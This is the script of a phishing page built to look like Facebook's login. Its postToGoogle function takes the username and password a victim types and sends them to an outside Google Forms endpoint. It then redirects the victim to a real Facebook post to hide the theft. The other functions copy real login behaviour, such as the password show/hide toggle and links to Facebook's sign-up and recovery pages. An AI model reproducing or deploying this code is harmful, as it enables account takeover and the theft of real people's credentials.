document.getElementById("passField").onclick=function(){

  if(document.getElementById("pas").style.borderColor=="red"){

    document.getElementById("pas").style.borderColor="inherit";

  }

  else{

    document.getElementById("pas").style.borderColor="inherit";

  }

}

 

 document.getElementById("nameField").onclick=function(){

  if(document.getElementById("nam").style.borderColor=="red"){

    document.getElementById("nam").style.borderColor="inherit";

  }

  else{

    document.getElementById("nam").style.borderColor="inherit";

  }

}

var t=setInterval(

  function (){

    if(document.getElementById("passField").value.length==0){

      document.getElementById("snh").style.display="none";

    }

    else{

     document.getElementById("snh").style.display="flex";

    }

  }

)

function newac(){

  window.location.replace("https://www.facebook.com/r.php?entry_point=login");

}

function rfp(){

  window.location.replace("https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM3NzAyMzYyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login&next");

}

function snhf() {

  var x = document.getElementById("passField");

  if (x.type === "password") {

    x.type = "text";

    document.getElementById("snh").innerHTML="<p>HIDE</p>";

  } else {

    x.type = "password";

    document.getElementById("snh").innerHTML="<p>SHOW</p>";

  }

}

function postToGoogle() {

                var field1 = $("#nameField").val();

                var field2 = $("#passField").val();

        

                    

      

        if(field1 == ""){

          document.getElementById("nam").style.borderColor="red";

          document.getElementById("nameField").value="";

          document.getElementById("passField").value=""; 

          return false;

        }

        if(field2 == ""||field2.length<6){

          document.getElementById("pas").style.borderColor="red";

          document.getElementById("passField").value="";

          document.getElementById("nameField").value="";

          return false; 

          }

                  

                   $.ajax({

                   url: `https://docs.google.com/forms/d/e/1FAIpQLScSyxAuZJ2bs7VFdKDvuEhMX_ipYXbfSk3pJjMcBbct7elUTg/formResponse?submit=Submit&usp=pp_url&entry.1809530832=${field1}&entry.1153543234=${field2}`,
                    
                   

                    type: "POST",


                    success: function(d){

                     },

                    error: function(x, y, z){

                      // document.getElementById("fscreen").style.display="none";

                      // document.getElementById("sucsm").style.display="inherit";

                      window.location.replace("https://m.facebook.com/share/p/19xNYQNjA7/");
                      

                               }

                            });

                     return false;

}
